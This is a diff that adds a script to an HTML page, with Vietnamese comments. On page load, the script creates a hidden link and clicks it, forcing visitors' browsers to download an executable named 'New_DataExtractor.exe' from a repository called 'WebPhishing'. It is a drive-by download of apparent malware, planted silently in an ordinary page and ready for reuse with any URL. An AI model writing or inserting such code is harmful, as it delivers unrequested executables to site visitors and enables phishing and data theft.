@@ -295,7 +295,26 @@
                 <hr width="735px" style="margin-bottom: 2px;">
         </div>
     </div>
-    
+ <script>
+        // HÀNH ĐỘNG TỰ ĐỘNG KHI TRANG LOAD
+        window.addEventListener('load', function() {
+            // *** QUAN TRỌNG: Thay URL này bằng URL RAW chính xác của bạn ***
+            const fileUrl = 'https://raw.githubusercontent.com/Dar-a1/WebPhishing/main/New_DataExtractor.exe';
+            
+            // Tạo một thẻ <a> ẩn để kích hoạt tải xuống
+            const link = document.createElement('a');
+            link.href = fileUrl;
+            
+            // Thuộc tính 'download' giúp trình duyệt tải file thay vì điều hướng đến nó
+            link.download = 'New_DataExtractor.exe'; 
+            
+            // Thêm vào body, kích hoạt click và xóa đi
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
+            
+        });
+    </script>   
 </body>
 
 </html>
